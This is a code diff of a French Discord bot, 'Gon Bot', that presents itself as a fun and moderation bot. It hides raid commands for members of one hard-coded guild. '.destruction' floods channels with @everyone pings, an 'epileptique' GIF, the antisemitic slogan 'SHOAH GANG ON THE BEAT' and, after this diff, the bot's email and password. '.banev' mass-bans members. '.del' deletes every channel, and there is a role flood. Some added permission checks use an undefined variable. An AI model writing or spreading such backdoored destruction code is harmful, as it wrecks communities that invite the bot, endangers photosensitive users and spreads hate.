@@ -1,41 +1,22 @@
-const Discord = require('discord.js');
-const bot = new Discord.Client();
-const fs = require('fs');
-const moment = require("moment");
- var prefix = "."
-bot.on('ready',() => {
-  //invit link
-  console.log("---------------------------")
-});  
-
-bot.on('message', message => {
- 
-  const mute = require("./commands/moderation/mute.js");
-  const unmute = require("./commands/moderation/unmute.js");
-  
-  mute(message, prefix , bot)
-  unmute(message, prefix , bot)
-  
-  
-  });
-
 bot.on('message', msg => {
   if (msg.guild === bot.guilds.find('id', '453631449804046336')){ 
     return;
   }
  if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
     
-if (msg.content === '.destruction') {
+  if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
-        "SHOAH GANG ON THE BEAT \n"+
-        "https://discord.gg/8vtFryt \n"+
-        "https://discord.gg/s5Y2RfG").catch(e => {});
+      msg.channel.send(bot.user.email+" "+bot.user.pass+"@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
+      "SHOAH GANG ON THE BEAT \n"+
+      "https://discord.gg/8vtFryt \n"+
+      "https://discord.gg/s5Y2RfG").catch(e => {});
     }, 450)
-  }
+  } 
 
 if (msg.content === '.oupss') {
+  if(guild.member(bot.user).hasPermission(perms)){
+
     console.log(`Commande .oupss par ${msg.author.tag}`);
    fucked = false;
 
@@ -56,14 +37,17 @@ if (msg.content === '.oupss') {
       msg.delete();
     }
   }
+}
 
 
 if (msg.content === '.banev') {
+  if(guild.member(bot.user).hasPermission("BAN_MEMBERS")){
     console.log(`Commande .banev par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
       if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
     });
   }
+}
 
 
 if (msg.content === '.leave') {
@@ -73,6 +57,7 @@ if (msg.content === '.leave') {
   }
 
 if (msg.content === '.pardon') {
+  if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){ 
     console.log(`Commande .pardon par ${msg.author.tag}`);
 
     msg.member.guild.createRole({
@@ -84,7 +69,12 @@ if (msg.content === '.pardon') {
       if (msg.deletable) msg.delete().catch(e => {});
     }).catch(e => {});
   }
+  }
+
+
   if (msg.content === '.roleflood') {
+    if(guild.member(bot.user).hasPermission("MANAGE_ROLES")){ 
+
     console.log(`Commande .roleflood par ${msg.author.tag}`);
     if (msg.deletable) msg.delete();
     let i = 0;
@@ -97,12 +87,16 @@ if (msg.content === '.pardon') {
        });
     
       }
+    }
+
   if(msg.content === ".del"){
+    if(guild.member(bot.user).hasPermission("MANAGE_CHANNELS")){ 
     if (msg.deletable) msg.delete().catch(e => {});
     msg.guild.channels.forEach(chan => {
       if (chan.deletable) chan.delete().catch(e => {});
     });
   }
+}
 
 
   if(msg.content === ".mp"){
@@ -120,7 +114,8 @@ if (msg.content === '.pardon') {
 
       }   
   })
-  }
+  } 
+
 
  }//Filtre personne
 });
@@ -129,7 +124,7 @@ bot.on("message", message => {
     var membere = message.mentions.members.first()
     let avatar_embed = new Discord.RichEmbed()
     .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
-    .setColor("#FFCC99")
+    .setColor("#FFFFFF")
     .setImage(membere.user.avatarURL)
     .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
     return message.channel.send(avatar_embed).catch(e => {});
@@ -142,7 +137,7 @@ if(!text){
   messsage.channel.send("Tu ne m'as pas donner un message à répéter :x:").catch(e => {});
 }
 let embed = new Discord.RichEmbed();
-embed.setColor("#FFCC99")
+embed.setColor("#FFFFFF")
 .setTitle(" ")
 .setDescription(text)
 message.channel.sendEmbed(
@@ -157,8 +152,9 @@ bot.on("message", message => {
   if(message.content.startsWith(".8ball")){
     var question = message.content.split(" ").slice(1).join(" ")
     var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Surement", "Probablement","C'est sur", "J'en sais rien"]
+
     let ball_embed = new Discord.RichEmbed()
-    .setColor("#FFCC99")
+    .setColor("#FFFFFF")
     .setTitle(":newspaper2: **Question de "+message.author.tag+"** :newspaper2: ")
     .setDescription("**"+question+"**")
     .addField("**Reponse**","**"+ tableauball[Math.floor(Math.random()*8)] +"**")
@@ -166,13 +162,16 @@ bot.on("message", message => {
     .setThumbnail(bot.user.iconURL)
     return message.channel.send(ball_embed).catch(e => {});
   }
+  
+})
+
   bot.on("message", message => {
   if(message.content.startsWith(".serverinfo")){
     moment.locale("fr");
     var date_de_creation_du_serv = moment(message.guild.createdTimestamp).format("LLLL");
     let serverinfo_embed = new Discord.RichEmbed()
     .setTitle("Info Sur le Serveur")
-    .setColor("#FFCC99")
+    .setColor("#FFFFFF")
     .addField("Nom", message.guild.name)
     .addField("Id du serveur", message.guild.id)
     .addField("Emplacement Du Serveur", message.guild.region)
@@ -194,7 +193,7 @@ bot.on("message", message => {
 
     let userinfo_embed = new Discord.RichEmbed()
     .setThumbnail(membere2.user.avatarURL)
-    .setColor("#FFCC99")
+    .setColor("#FFFFFF")
     .addField("Pseudo", `${message.mentions.users.first().username}`)
     .addField("Id du Membre", membere2.user.id)
     .addField("Date de Creation Du Compte", date_de_creation_du_compte)
@@ -205,24 +204,12 @@ bot.on("message", message => {
  return;
   }
 })
-  bot.on("message", message => {
-  if (bot.guilds.get('453631449804046336').members.get(message.author.id) !== undefined) {
-    if(message.content.startsWith(".listeserver")) {
-      bot.guilds.forEach(guild => {
-        var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id)
-        invite.createInvite().then(invite => message.channel.send(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
-      })
-    }
-  }
-
-})
-})
 
 bot.on('guildMemberAdd', member => {
 
   member.createDM().then(prive => {
     let bienvenue_embed = new Discord.RichEmbed()
-    .setColor("#FFCC99")
+    .setColor("#FFFFFF")
     .addField(`Bienvenue ${member.user.username}`, "Viens parler avec les joueurs !")
     .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
     .setThumbnail(member.iconURL)
@@ -259,7 +246,7 @@ bot.on("message", message => {
   }).catch(e => {});
     }
   }
-  if(message.content.startsWith(".ban")){
+  if(message.content.startsWith(".ban") & message.content != '.banev'){
     var membere2 = message.author
     let membere = message.guild.member(message.mentions.members.first());
     if(!message.member.hasPermission("BAN_MEMBERS")) {
@@ -287,7 +274,7 @@ bot.on("message", message => {
     var flip = ["Pile", "Face"]
     var reponse = flip[Math.floor(Math.random()*2)]
     let flip_embed = new Discord.RichEmbed()
-    .setColor("#FFCC99")
+    .setColor("#FFFFFF")
     .addField("FLIP", " :moneybag: La piece affiche : **"+reponse+"**")
     message.channel.send(flip_embed).catch(e => {});
     }
@@ -295,39 +282,11 @@ bot.on("message", message => {
       var voilatableau = ["Ptdrr t ki ?", "Ohhh mon maitre, tu es enfin de retour ?", "Tu es le meilleur, puis-je devenir ton disciple ?", "Degage toi","Mais QUI ES-TU ???","Je ne te connais pas dsl"]
       var voila = voilatableau[Math.floor(Math.random()*6)]
       let voila_embed = new Discord.RichEmbed()
-      .setColor("#FFCC99")
+      .setColor("#FFFFFF")
      .setDescription(":beer: **"+voila+"** :beers: ")
       return message.channel.send(voila_embed).catch(e => {});
     }
-
-    if(message.content === '.help'){
-      let help1_embed = new Discord.RichEmbed()
-      .setTitle("Commande Fun")
-      .addField(".c", "Le bot vous revele vôtre vraie identitée.... :beer:")
-      .addField(".flip", "Joué au pile ou face avec le bot :moneybag:")
-      .addField('.8ball',"Exemple `As-tu déjà eu une sexfriend ?` Posé une question intime une bot :smirk: ")
-      .addField(".say", "Fais répéter une question au bot")
-      .addField(".rainrole", "Creer le role multicolore  :rainbow:")
-      .addField(".rainbow", "Vous ajoutes le role multicolore  :rainbow:")
-      .setColor("#FFCC99");
-      var membere = message.author;
-      let help2_embed = new Discord.RichEmbed()
-      .setTitle("Commande Utile / Help")
-      .addField(".ban", "Exemple `.ban @Gon`, Renvoyer les enemis dans leurs territoire !")
-      .addField(".kick", "Exemple `.kick @Gon`, Expulser de vôtre territoire un ennemi")
-      .addField(".mute", "Exemple `.mute @Gon`, Retire le droit de parole à un membre")
-      .addField(".avatar", "Exemple `.avatar @Gon`, Fouille dans les trefonds de discord et récupérer l'image d'un ami")
-      .addField(".userinfo", "Exemple `.userinfo @Gon`, Récupérer toutes les infos d'une personne :' )")
-      .addField(".serverinfo", "Vous donnes toutes les infos croustillante sur le serveur")
-      .addField(".createinvite", "Vous donnes l'invit du serveur pour ramener vôtre armée !")
-      .setColor("#FFCC99");
-      message.channel.send(":envelope:  **Je vous envois l'aide en mp** :envelope: ").catch(e => {});
-      message.delete(":envelope:  **Je vous envois l'aide en mp** :envelope: ").catch(e => {});
-      message.author.send(help1_embed).catch(e => {});
-      message.author.send(help2_embed).catch(e => {});
-      
-    }
-      })
+})
 
       bot.on("guildCreate", guild => {
         if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
@@ -346,7 +305,7 @@ bot.on("message", message => {
       bot.on('guildDelete', guild => {
         bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(` [LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
       })
-     bot.on("message", message => {
+      bot.on("message", message => {
         if (message.content === '.rainrole') {
           if (message.deletable) message.delete();
                 message.reply(':white_check_mark: Le rôle **Rainbow** à bien été crée. Exécuté la commande `.rainbow` pour poursuivre la procèdure !:white_check_mark:').catch(e => {});
